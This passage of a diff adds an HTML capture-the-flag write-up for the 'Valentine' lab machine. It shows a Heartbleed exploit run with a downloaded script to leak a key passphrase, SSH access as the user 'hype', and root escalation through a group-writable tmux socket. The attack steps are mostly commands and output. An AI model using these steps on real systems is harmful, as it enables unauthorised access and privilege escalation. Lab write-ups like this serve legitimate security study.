+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wget&nbsp;-q&nbsp;https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine<span style="color:#ff9d00;font-weight:700">/</span>heartbleed]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;heartbleed.py&nbsp;10.10.10.79&nbsp;-n&nbsp;5&nbsp;-r&nbsp;rawout.txt&nbsp;-a&nbsp;asciiout.txt</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine<span style="color:#ff9d00;font-weight:700">/</span>heartbleed]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#tail&nbsp;asciiout.txt&nbsp;</span><br>
+                ...<span style="color:#ff9d00;font-weight:700">!</span>.9.8.........5...............<br>
+                .........3.2.....E.D.....<span style="color:#ff9d00;font-weight:700">/</span>...A.................................I.........<br>
+                ...........<br>
+                ...................................#.......0.0.1<span style="color:#ff9d00;font-weight:700">/</span>decode.php<br>
+                Content-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;application<span style="color:#ff9d00;font-weight:700">/</span>x-www-form-urlencoded<br>
+                Content-Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;42<br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">$text</span>=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==W..M.p#.Q.&gt;..?.......................<span style="color:#3ad900;font-weight:400">'...3.<br>
+                ........nR.."...2.I}&nbsp;..<br>
+                ..{......^..yJ.........&lt;gedObjectReference"&nbsp;type="ServiceInstance"&gt;ServiceInstance&lt;/_this&gt;&lt;/RetrieveServiceContent&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;"..BX.j~v.-kgO.....`</span>
+            </div>
+        </div><br>
+        <br>
+        At the end of <code>asciiout.txt</code>, we see a base64 encoded string.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine<span style="color:#ff9d00;font-weight:700">/</span>heartbleed]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#echo&nbsp;"aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=="&nbsp;|&nbsp;base64&nbsp;-d</span><br>
+                heartbleedbelievethehype
+            </div>
+        </div><br>
+        <br>
+        <code>hype</code> implies to me, considering I couldn't find anything else on the server, that <code>heartbleedbelievethehype</code> is the passphrase to <code>hype</code>'s SSH key we retreived.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) ssh hype</strong></h2><br>
+        SSH in as <code>hype</code>.<br>
+            <div class="codebox">
+                ┌─[✗]─[horace@parrot]─[~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;hype@valentine.htb&nbsp;-i&nbsp;hype_key.rsa</span><br>
+                Enter&nbsp;passphrase&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">key</span>&nbsp;'hype_key.rsa':&nbsp;heartbleedbelievethehype<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;12.04&nbsp;LTS&nbsp;(GNU/Linux&nbsp;3.2.0-23-generic&nbsp;x86_64)<br>
+                <br>
+                &nbsp;*&nbsp;Documentation:&nbsp;&nbsp;https://help.ubuntu.com/<br>
+                <br>
+                New&nbsp;release&nbsp;'14.04.5&nbsp;LTS'&nbsp;available.<br>
+                Run&nbsp;'<span style="color:#ff9d00;font-weight:700">do</span>-release-upgrade&nbsp;to&nbsp;upgrade&nbsp;to&nbsp;it.<br>
+                <br>
+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Thu&nbsp;Oct&nbsp;24&nbsp;01<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>41&nbsp;2019&nbsp;from&nbsp;10.10.14.18<br>
+                hype@Valentine<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;~&nbsp;-name&nbsp;user.txt&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>hype<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>user.txt<br>
+                hype@Valentine<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>hype<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>user.txt<br>
+                e6710a546...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) tmux</strong></h2><br>
+        List the processes running as root on the system with <code>ps aux | grep root</code>.<br>
+        There's a tmux socket running as root.<br>
+            <div class="codebox">
+                hype@Valentine<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;root<br>
+                [...]<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1010&nbsp;&nbsp;0.0&nbsp;&nbsp;0.1&nbsp;&nbsp;26416&nbsp;&nbsp;1360&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ss&nbsp;&nbsp;&nbsp;01<span style="color:#ff9d00;font-weight:700">:</span>24&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>tmux&nbsp;-S&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>.devs<span style="color:#ff9d00;font-weight:700">/</span>dev_sess
+            </div>
+        </div><br>
+        <br>
+        If you check the permissions of the tmux socket, the group ownership is <code>hype</code>, which has read and write permissions to the socket.<br>
+            <div class="codebox">
+                hype@Valentine<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>.devs<span style="color:#ff9d00;font-weight:700">/</span>dev_sess<br>
+                srw-rw----&nbsp;1&nbsp;root&nbsp;hype&nbsp;0&nbsp;Jul&nbsp;25&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>05&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>.devs<span style="color:#ff9d00;font-weight:700">/</span>dev_sess
+            </div>
+        </div><br>
+        <br>
+        Because of those permissions, we can connect to the root tmux socket and hop onto a root shell.<br>
+            <div class="codebox">
+                hype@Valentine<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;tmux&nbsp;-S&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>.devs<span style="color:#ff9d00;font-weight:700">/</span>dev_sess
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                root@Valentine<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>hype#&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span><br>
+                root@Valentine<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>hype#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~<br>
+                root@Valentine<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;root.txt<br>
+                f1bb6d75...
+            </div>
+        </div><br>
+        <br>
+        <code>hype</code>'s bash history also leaves a hint at where you should look for the privesc (or how exactly to do it).<br>
+            <div class="codebox">
+                hype@Valentine<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;.bash_history<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                exot<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-la<br>
+                <span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span><br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-la<br>
+                <span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;.devs<br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-la<br>
+                tmux&nbsp;-L&nbsp;dev_sess&nbsp;<br>
+                tmux&nbsp;a&nbsp;-t&nbsp;dev_sess&nbsp;<br>
+                tmux&nbsp;--help<br>
+                tmux&nbsp;-S&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>.devs<span style="color:#ff9d00;font-weight:700">/</span>dev_sess&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span>
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
